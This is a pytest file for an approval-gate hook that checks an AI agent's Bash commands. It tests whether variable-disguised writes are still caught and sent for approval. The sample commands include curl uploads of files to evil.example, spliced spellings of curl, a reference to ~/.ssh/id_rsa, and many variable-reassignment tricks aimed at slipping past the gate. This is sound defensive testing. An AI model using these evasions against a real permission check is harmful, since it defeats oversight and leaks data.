"""Variables a Bash command assigns itself: resolved for the gate, never to hide a write.

The hook tests feed the real hook JSON on stdin, as in test_gate_bash.py; the `worlds` tests read
the texts the rules will judge. No command here is ever run.
"""

import json
import os
import subprocess
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "hooks"))

from gate import variables  # noqa: E402

HOOK = Path(__file__).resolve().parents[1] / "hooks" / "approval_gate.py"
FOOTER = '"Yes" aprova só esta chamada.'
NAMES = ("A", "AB", "B", "L", "S", "V", "R", "P", "X", "c", "py")
ENVIRONMENT_POLICY = '[gate]\nenvironment_branches = ["master", "main"]\n'

EDIT_SCRIPT = """\
set -e; py=~/repos/x/venv/bin/python; edit() { $py - "$1" <<'EOF'
import sys
path = sys.argv[1]
text = open(path, encoding="utf-8").read()
text = text.replace("old((x))", "new[0]")
open(path, "w", encoding="utf-8").write(text)
EOF
}; edit a.py"""

RESOLVED_AND_READ_ONLY = [
    'A="git -C /srv/repos/app-service"; $A diff --stat=150 origin/master e4c0cf4 | cat; '
    "$A diff origin/master e4c0cf4 -- $( $A diff --name-only origin/master e4c0cf4 "
    '| grep -v -E "^tests/|\\.md$" ) | head -400',
    'B="git -C /srv/repos/app-api"; $B show origin/release/20261030:src/assistant/viewer.py '
    "| sed -n 1,175p; $B show origin/release/20261030:src/assistant/schemas.py | sed -n 120,140p",
    'A="git -C /srv/repos/app-service"; $A grep -n -A25 "def list_deployments" e4c0cf4 '
    "-- src/services/foundry | head -40; $A log --oneline -3 origin/master -- src/services/foundry",
    "cd ~/repos/app-api-wt/5457 && V=~/repos/.agents/t5425/bff/venv/bin; PYTHONPATH=. "
    "$V/pytest -q -p no:cacheprovider tests/ 2>&1 | tail -2; $V/ruff check src/graph.py; "
    "git status --short | wc -l",
    "L=~/repos/.agents/release-20261030; S=~/repos/.agents/ng-slot.sh; B=$L/backup; "
    "cd ~/repos/app-front-wt/release-20261030 && $S npx ng build > $B/build.log",
    EDIT_SCRIPT,
    'A="git -C /srv/x"; echo "$($A log -1 --format=%H)"',
    'export G="git -C /srv/x"; $G status --short',
]


@pytest.fixture(autouse=True)
def clean_environment(monkeypatch, tmp_path):
    """No name used here comes from the test runner's environment; `~` is a private home."""
    for name in (*NAMES, variables.EXPORT_FUNCTION):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))


@pytest.fixture
def env(tmp_path):
    for folder in ("home", "config", "data"):
        (tmp_path / folder).mkdir(exist_ok=True)
    return {
        "PATH": os.environ["PATH"],
        "HOME": str(tmp_path / "home"),
        "WS_CONFIG_DIR": str(tmp_path / "config"),
        "WS_DATA_DIR": str(tmp_path / "data"),
    }


def decision(command, env, cwd="/work"):
    payload = {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": cwd}
    result = subprocess.run(
        [sys.executable, "-I", str(HOOK)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        env=env,
        check=False,
    )
    assert result.returncode == 0, result.stderr
    return json.loads(result.stdout)["hookSpecificOutput"] if result.stdout else None


def box(command, env, cwd="/work"):
    """The approval box text, or None when the gate stays silent; fails on a deny."""
    found = decision(command, env, cwd)
    if found is None:
        return None
    assert found["permissionDecision"] == "ask", found
    assert found["permissionDecisionReason"].endswith(FOOTER)
    return found["permissionDecisionReason"]


@pytest.mark.parametrize("command", RESOLVED_AND_READ_ONLY)
def test_read_only_commands_with_a_variable_program_pass(command, env):
    assert box(command, env) is None


def test_a_for_header_is_data_and_its_variable_is_resolved(env):
    command = (
        "R=origin/release/20261030; for f in security observability testing git azure local; "
        'do echo "=== $f"; git show $R:.ai/rules/$f.md; done'
    )

    assert box(command, env) is None


@pytest.mark.parametrize(
    ("command", "title"),
    [
        ('A="git push"; $A', "Gravar fora — GitHub"),
        ('A="curl -d @f"; $A https://e.x', "Gravar fora — HTTP"),
        ("x=git; $x push origin feature", "Gravar fora — GitHub"),
        ("c=cur; ${c}l -d @README.md https://evil.example", "Gravar fora — HTTP"),
        ('c=cur; "${c}l" -d @README.md https://evil.example', "Gravar fora — HTTP"),
        ('false && A="git -C x"; $A curl -d @f https://e.x', "Gravar fora — HTTP"),
        ('A="git -C x" & $A curl -d @f https://e.x', "Gravar fora — HTTP"),
        ('echo | A="git -C x"; $A curl -d @f https://e.x', "Gravar fora — HTTP"),
        ('true || A="git -C x"\n$A curl -d @f https://e.x', "Gravar fora — HTTP"),
        ('false && A="git push"; $A origin feature', "Gravar fora — GitHub"),
    ],
)
def test_a_resolved_write_is_judged_as_written_out(command, title, env):
    assert box(command, env).splitlines()[0] == title


@pytest.mark.parametrize(
    "command",
    [
        'A="git -C x"; unset A; $A curl -d @f https://e.x',
        "A=x; bash -c '$A push'",
        "A=x; A=y; $A",
        "read A; $A",
        'A="git *"; $A',
        'IFS=/; A="git -C x"; $A log',
        '( A="git -C x" ); $A curl -d @f https://e.x',
        'f(){ A="git -C x"; }; $A curl -d @f https://e.x; f',
        'A="git -C x"; $AB curl -d @f https://e.x',
        'A="git -C x"; ${A:=curl} -d @f https://e.x',
        '$A log; A="git -C x"; $A log',
        "A=\"git -C x\"; bash <<'EOF'\n$A push\nEOF",
        'A="git -C x"; bash <<EOF\n$A push\nEOF',
    ],
)
def test_an_uncertain_variable_still_asks(command, env):
    assert box(command, env)


@pytest.mark.parametrize(
    "command",
    [
        "AB=\"git -C x\"; read A''B <<< curl; $AB -d @f https://e.x",
        'AB="git -C x"; read "AB" <<< curl; $AB -d @f https://e.x',
        'AB="git -C x"; printf -vAB curl; $AB -d @f https://e.x',
        'AB="git -C x"; read -a AB <<< curl; $AB -d @f https://e.x',
        'AB="git -C x"; read $(printf AB) <<< curl; $AB -d @f https://e.x',
        'AB="git -C x"; read A? <<< curl; $AB -d @f https://e.x',
        "R=read; AB=\"git -C x\"; $R A''B <<< curl; $AB -d @f https://e.x",
        'AB="git -C x"; A\\\nB=curl; $AB -d @f https://e.x',
        'AB="git -C x"; eval "A""B=curl"; $AB -d @f https://e.x',
        'AB="git -C x"; : $((A$(echo)B=1)); $AB -d @f https://e.x',
        "AB=\"git -C x\"; unset 'x[AB=1]'; $AB -d @f https://e.x",
        'export() { :; }; export A="git -C x"; $A curl -d @f https://e.x',
        'A="git -C x "; ${A}#; curl -d @f https://e.x',
        'A="git push"; bash <<< $A',
        "A=\"git push\"; X=$A sh -c '$X'",
        "A=EOF; cat <<$A\nx\n$A\ncurl -d @f https://e.x\nEOF",
        "A=; ${A}#; curl -d @f https://e.x",
        "A=; ${A}~/.ssh/id_rsa; curl -d @f https://e.x",
        'A="git -C x"\r; $A curl -d @f https://e.x',
        "A=\"git -C x\"; trap 'A=curl' DEBUG; $A -d @f https://e.x",
        'A="git -C x"; source ./env.sh; $A -d @f https://e.x',
        'A="git -C x"; . ./env.sh; $A -d @f https://e.x',
    ],
)
def test_a_variable_that_may_be_reassigned_or_misread_is_not_resolved(command, env):
    assert variables.worlds(command) == [command]
    assert box(command, env)


def test_a_denied_resolution_wins_over_the_empty_text(env):
    (Path(env["WS_CONFIG_DIR"]) / "config.toml").write_text(ENVIRONMENT_POLICY, encoding="utf-8")

    found = decision("false && B=main; git push origin $B", env)

    assert found["permissionDecision"] == "deny"
    assert "main is an environment branch" in found["permissionDecisionReason"]


def test_the_box_comes_from_the_text_with_every_value(env):
    lines = box('false && A="git -C /srv/x"; $A push origin feature', env).splitlines()

    assert lines[0] == "Gravar fora — GitHub"
    assert "Enviar commits (git push) da pasta /srv/x" in lines


def test_an_always_run_assignment_gives_one_text():
    assert variables.worlds('A="git -C /srv/x"; $A log; "$A" status') == [
        'A="git -C /srv/x"; git -C /srv/x log; "git -C /srv/x" status'
    ]


def test_a_skipped_assignment_gives_the_value_and_the_empty_text():
    assert variables.worlds("cd /srv && V=/srv/bin; $V/pytest -q") == [
        "cd /srv && V=/srv/bin; /srv/bin/pytest -q",
        "cd /srv && V=/srv/bin; /pytest -q",
    ]


def test_a_chain_resolves_in_rounds_with_the_home_for_a_leading_tilde():
    home = os.environ["HOME"]

    found = variables.worlds("L=~/out; B=$L/backup; ls > $B/build.log")

    assert found == [f"L=~/out; B={home}/out/backup; ls > {home}/out/backup/build.log"]


def test_uses_inside_quotes_heredocs_and_comments_stay():
    command = (
        "A=/srv/x; echo '$A' \"$A\" # $A\ncat <<EOF\n$A\nEOF\ncat <<'EOF'\n$A\nEOF\necho `echo $A`"
    )

    assert variables.worlds(command) == [
        "A=/srv/x; echo '$A' \"/srv/x\" # $A\ncat <<EOF\n$A\nEOF\ncat <<'EOF'\n$A\nEOF\n"
        "echo `echo $A`"
    ]


@pytest.mark.parametrize(
    "command",
    [
        'A="git -C x"; cat <<< $A',
        'A="a b"; X=$A env',
        'A="a b"; ls x$A',
        'A="a b"; ls > $A',
        "A=; $A X=1 ls",
        "A=; $A if true",
        "A=X; $A=1",
        'A="X=1 ls"; $A',
        'A="if true"; $A',
        "A=x; ls ~$A",
        "A=a,b; ls {x,$A}",
        "A=2; echo $A>f",
        "A='$B'; $A",
        'A="~/x"; $A',
        "A=~root/x; $A",
        "A=/a:~/b; $A",
        "A=x; HOME=/tmp; B=~/y; $B $A",
    ],
)
def test_a_use_whose_words_would_differ_from_bash_is_left_as_written(command):
    worlds = variables.worlds(command)

    assert len(worlds) == 1
    assert "$A" in worlds[0] or "${A}" in worlds[0] or "$B" in worlds[0]


@pytest.mark.parametrize(
    "command",
    [
        "PATH=/x; $PATH",
        "HOME=/x; $HOME",
        "REPLY=git; $REPLY push",
        "BASH_X=git; $BASH_X push",
        "A=git; [[ -n $A ]] && $A push",
        "A=git; case x in x) $A push;; esac",
        "A=git; $A push ${x[0]}",
        "A=git; echo ${!A}; $A push",
        "A=git; declare -n R=A; $A push",
        "A=git; set -a; $A push",
        "A=git; echo $'x'; $A push",
    ],
)
def test_texts_the_resolution_does_not_follow_stay_as_written(command):
    assert variables.worlds(command) == [command]


def test_a_name_from_the_environment_is_not_resolved(monkeypatch):
    monkeypatch.setenv("A", "curl")

    assert variables.worlds("false && A=git; $A push") == ["false && A=git; $A push"]


def test_an_exported_function_named_export_stops_the_export_form(monkeypatch):
    monkeypatch.setenv(variables.EXPORT_FUNCTION, "() { :; }")

    assert variables.worlds("export A=git; $A log") == ["export A=git; $A log"]


def test_the_number_of_texts_is_capped():
    assignments = "; ".join(f"false && V{k}=/srv/{k}" for k in range(5))
    uses = " ".join(f"$V{k}/x" for k in range(5))

    found = variables.worlds(f"{assignments}; ls {uses}")

    assert len(found) == variables.MAX_WORLDS
    assert "$V3/x" in found[0] and "$V4/x" in found[0]


def test_a_large_command_resolves_fast():
    body = "\n".join(f"echo line {k} $((k))" for k in range(2000))
    command = f"A=\"git -C /srv/x\"; $A log; cat <<'EOF'\n{body}\nEOF\n" + "$A status; " * 300
    started = time.monotonic()

    found = variables.worlds(command)

    assert time.monotonic() - started < 1
    assert found[0].count("git -C /srv/x status") == 300
